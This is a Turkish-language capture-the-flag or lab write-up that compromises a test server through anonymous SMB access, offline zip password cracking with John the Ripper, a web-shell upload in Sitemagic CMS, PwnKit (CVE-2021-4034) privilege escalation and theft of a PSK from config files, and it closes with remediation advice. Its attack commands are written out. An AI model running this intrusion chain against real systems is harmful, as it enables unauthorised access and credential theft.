01 — Keşif

Nmap taraması ve SMB anonim erişimi

Hedef sunucuda (10.0.2.15) yapılan Nmap taramasında 22 (SSH), 80 (HTTP), 139 ve 445 (SMB) portlarının açık olduğu tespit edildi. SMB servisine anonim (parolasız) giriş denendi ve başarılı oldu.

nmap -sV
$ nmap -sV 10.0.2.15
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: KB-SERVER; OS: Linux
smbclient -L anonim
$ smbclient -L //10.0.2.15/ -N
Anonymous login successful

Sharename       Type      Comment
---------       ----      -------
Files           Disk      HACK ME
IPC$            IPC       IPC Service (Samba 4.7.6-Ubuntu)

"HACK ME" açıklamasına sahip Files paylaşımı listelendiğinde, içerisinde parola korumalı sıkıştırılmış bir dosya (website.zip) bulundu.

02 — Veri Sızdırma ve Parola Kırma

website.zip'in çevrimdışı kırılması

Dosya yerel makineye indirilip zip2john ile hash'i çıkarıldı, ardından John the Ripper ile rockyou.txt'a karşı çevrimdışı kaba kuvvet (offline brute-force) saldırısı uygulandı.

smbclient get + john
$ smbclient //10.0.2.15/Files -N
smb: \> get website.zip
getting file \website.zip of size 38036127 as website.zip

$ zip2john website.zip > zip.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
Loaded 1 password hash (PKZIP [32/64])
porchman         (website.zip)
1g 0:00:00:00 DONE (2026-03-26 10:37) 2.083g/s 9514Kp/s
Session completed.

Zip içeriğinden elde edilen veriler incelendiğinde, port 80'de çalışan Sitemagic CMS uygulamasına ait kimlik bilgileri ve dizin yapıları keşfedildi.

03 — Foothold

Sitemagic CMS üzerinden dosya yükleme RCE

Kırılan parola ve zip içinden elde edilen kimlik bilgileriyle Sitemagic CMS yönetim paneline giriş yapıldı. Panelin File Manager modülü istismar edilerek sunucuya shell.php isimli zararlı bir web betiği yüklendi.

reverse shell → user.txt
$ curl "http://kb.vuln/sitemagic/index.php?SMFileArr=&SMExtDisplay=shell.php"
www-data@kb-server:/home/heisenberg$ cat user.txt
cat user.txt
[redacted]
✓ www-data yetkisiyle sisteme ilk erişim (Initial Access) ve user.txt ele geçirildi

04 — Yetki Yükseltme

PwnKit (CVE-2021-4034) ile root

Sistemde dikey yetki yükseltme amacıyla yapılan yerel keşiflerde SUID bitine sahip dosyalar tarandı; /usr/bin/pkexec'in güncel olmadığı ve gerekli yamaların uygulanmadığı saptandı. policykit-1 paketinin pkexec bileşenindeki kritik bellek yönetimi hatası (Out-of-Bounds Read/Write — CVE-2021-4034), hiçbir parola veya kimlik doğrulaması gerekmeden doğrudan root ayrıcalıkları elde edilmesine olanak tanıdı.

SUID keşfi + PwnKit
www-data@kb-server:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/pkexec

www-data@kb-server:~$ # pkexec /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
✓ root kabuğu elde edildi — sistem tamamen kompromize edildi

05 — Veri Sızdırma

IPSec yapılandırma dosyasından PSK sızıntısı

Root erişimi sağlandıktan sonra yapılan derinlemesine veri taramasında, kurumun ağ altyapısı ve VPN tünellemesi için kritik önem taşıyan IPSec yapılandırma dosyalarının savunmasız ve açık metin (cleartext) olarak saklandığı tespit edildi.

grep -r portmaster.elemental.net
# grep -r "portmaster.elemental.net" /etc /var /root 2>/dev/null
/etc/radcli/servers:#portmaster.elemental.net          [redacted]
/etc/radcli/servers-tls:#portmaster.elemental.net       psk:server1:[redacted]

/etc/radcli/servers-tls dosyasının içeriği okunarak portmaster.elemental.net adresine ait PSK bilgisi başarıyla sızdırılmıştır.

✓ kritik şifreleme anahtarı (Root Flag) sızdırıldı

Çözüm ve İyileştirme

Öneriler

  • PwnKit: İşletim sisteminin paket yöneticisi kullanılarak policykit-1 paketi acilen yamalanmış sürüme güncellenmelidir. Anlık güncelleme mümkün değilse geçici önlem olarak pkexec'ten SUID biti kaldırılmalıdır (chmod 0755 /usr/bin/pkexec).
  • Sitemagic CMS: NIST SP 800-63B standartlarına uygun olarak 10 başarısız oturum açma denemesinden sonra hesaplar kilitlenmeli, parolalar en az 12 karakter olmalı; kritik yönetim panellerine erişim iç ağ ile kısıtlanmalı ve MFA eklenmelidir.
  • IPSec/PSK: Hassas şifreleme anahtarları ve parolalar sunucuda açık metin olarak bulundurulmamalı; mümkünse merkezi bir anahtar yönetim sistemi (KMS/Vault) kullanılmalı ve dosya izinleri en kısıtlı seviyeye indirilmelidir (chmod 600).
